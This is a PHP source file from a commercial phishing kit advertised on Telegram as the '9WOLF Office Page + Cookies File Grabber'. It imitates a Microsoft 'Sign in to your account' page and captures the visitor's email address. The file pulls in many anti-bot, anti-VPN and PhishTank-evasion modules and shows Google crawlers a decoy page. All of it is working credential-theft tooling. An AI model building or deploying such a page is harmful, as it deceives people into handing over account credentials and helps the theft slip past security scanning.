<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "../site/";
require ("../9WOLFConfi/Guration.php");
require ("../9WOLFConfi/Function.php");
require ("../9WOLFDecline/AntiBotIp.php");
require ("../9WOLFDecline/AntiBotPw.php");
require ("../9WOLFDecline/AntiBotKillBot.php");
require ("../9WOLFDecline/AntiBotUserAgent.php");
require ("../9WOLFDecline/AntiBotIsp.php");
require ("../9WOLFDecline/AnitiBotHost.php");
require ("../9WOLFDecline/AntiBotPhishTank.php");
require ("../9WOLFDecline/AntiBotVpn.php");
require ("../9WOLFDecline/AntiBotProxy.php");
require ("../9WOLFDecline/AntBotProtection.php");
require ("../9WOLFDecline/SaveBrowsing.php");
require ("../9WOLFDecline/DiscoveredBot.php");
require ("../9WOLFDecline/AntiBotThree.php");
require ("../9WOLFDecline/DisturbOne.php");
require ("../9WOLFDecline/DisturbTwo.php");
require("../9WOLFDecline/Anti/Bot-Crawler.php");
@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
$rand = generateRandomString(130);
$cage = substr(sha1(mt_rand()),1,25);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}

if (isset($_POST['hidden']) && !empty($_POST['9WOLFDatorKiller'])  ) {
  include($path."index.php"); exit();
}
if (!isset($_SESSION['9WOLF_SESSION_T0k3n'])  ) {
  include($path."index.php"); exit();
}
#if (!isset($_POST['token9WOLFCsrf'])) {
#    include($path."index.php");
  
#}
#if ($_POST['token9WOLFCsrf'] != $_SESSION['9WOLF_SESSION_T0k3n']) {
#    include($path."index.php"); 
#}
if (isset($_POST['emailaccess'])){
   $_SESSION['emailaccess']  = $_POST['emailaccess'];
   }
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="googlebot" content="noindex,nofollow" />
    <meta name="googlebot-news" content="nosnippet">
    <META NAME="robots" CONTENT="nofollow">
    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Cache-Control" content="private">
    <meta http-equiv="Pragma" content="no-cache">
    <title><?php echo htmlentities("Sign in to your account", ENT_QUOTES, "UTF-8"); ?></title>
    <link rel="shortcut icon" href="./assets/mic.ico">
    <link rel="stylesheet" href="./assets/1.css">
    <link rel="stylesheet" href="./assets/em.css">
    
    


</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    
    


<div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form  id="i0281" spellcheck="false" method="POST" novalidate="novalidate" target="_top" no autocomplete="off"  action="<?php echo $priv6;?>" class="provide-min-height">
    <input type="hidden" name="token9WOLFCsrf" value="<?php echo $_SESSION['9WOLF_SESSION_T0k3n'];?>">
                                                <input type="hidden" name="9WOLFDatorKiller" value=""> 
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class="provide-min-height"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods,
    event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column"><div class="win-scroll"><img class="if" src="assets/marching_ants_b540a8e518037192e32c4fe58bf2dbab.gif" alt="Paris">
        <style>
.if {
  display: block;
  margin-left: auto;
  margin-right: auto;
}
</style>
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->

    <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

<div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }"><div>
    <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
        <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
        <!-- ko if: isSubtitleVisible --><!-- /ko -->
    </div>

    <!-- ko if: headerDescription --><!-- /ko -->
</div></div><span class="error" style="display: none;color: red;">Enter a valid email address, phone number, or Skype name.</span>

<!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko -->

<div class="row">
    <div role="alert" aria-live="assertive">
        <!-- ko if: usernameTextbox.error --><!-- /ko -->
        <div  class=" msg alert alert-error col-md-24 alert_msg_yxq alert_email_sect" style="display: none; color: rgb(232, 17, 35);" id="usernameError" data-bind="
            htmlWithBindings: usernameTextbox.error,
            childBindings: {
                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick } }">
                                                    We couldn't find an account with that username. Try another, or
                                                    <a id="idA_PWD_SignUp" href="">
                get a new Microsoft account
                </a>.</div>
    </div>

    <div class="form-group col-md-24">
        <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

        <!-- ko ifnot: prefillNames().length > 1 -->
        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

<input type="text" id="mailid"  name="emailaccess" autofocus='text'  value="" maxlength="70" class="form-text-input disable-on-submit is-empty form-control ltr_override input ext-input text-box ext-text-box input " placeholder="Email, phone, or Skype"  >





<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        <!-- /ko -->
    </div>
</div>

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                <!-- ko if: svr.fIsSelfServiceSignupUxEnabled --><!-- /ko -->
                
                <!-- ko ifnot: svr.fIsSelfServiceSignupUxEnabled -->
                <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp || '#',
                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">No account? <a href="" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                <!-- /ko -->
                <!-- /ko -->

                <!-- ko ifnot: hideCantAccessYourAccount -->
                <div class="form-group">
                    <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
                        text: unsafe_cantAccessYourAccountText,
                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                        href: accessRecoveryLink || '#'" href="#">Can’t access your account?</a>
                </div>
                <!-- /ko -->

                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink || isOfflineAccountVisible) --><!-- /ko -->

                <!-- ko if: showCredPicker --><!-- /ko -->

                <!-- ko if: svr.urlSkipZtd --><!-- /ko -->
            </div>
        </div>
    </div>
</div>

<!-- ko if: svr.fShowLegalMessagingInline --><!-- /ko -->

<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible -->
    <div class="inline-block">
        <input type="button" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
            externalCss: {
                'button': true,
                'secondary': true },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled" value="Back">
    </div>
    <!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input onclick="return isEmpty()" type="submit" name="Submit"  id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary"  value="Next" data-report-attached="1">
    </div>
</div></div>
    </div>
</div>
<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->


        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
</div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons -->
        <div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
            <div class="promoted-fed-cred-content" data-bind="css: {
                'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
                'slide-out-next': $page.animate.isSlideOutNext,
                'slide-in-next': $page.animate.isSlideInNext,
                'slide-out-back': $page.animate.isSlideOutBack,
                'slide-in-back': $page.animate.isSlideInBack,
                'app': $page.backgroundLogoUrl }">

                <!-- ko foreach: $page.otherSigninOptions -->
                <div class="row tile">
                    <div class="table" role="button" tabindex="0" data-bind="
                        css: { 'list-item': svr.fSupportWindowsStyles },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text" aria-label="Sign-in options">

                        <div class="table-row">
                            <div class="table-cell tile-img medium">
                                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
                            </div>
                            <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                                <div data-bind="
                                    text: $data.text,
                                    attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- /ko -->
            </div>
        </div>
        <!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>
</form>
    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
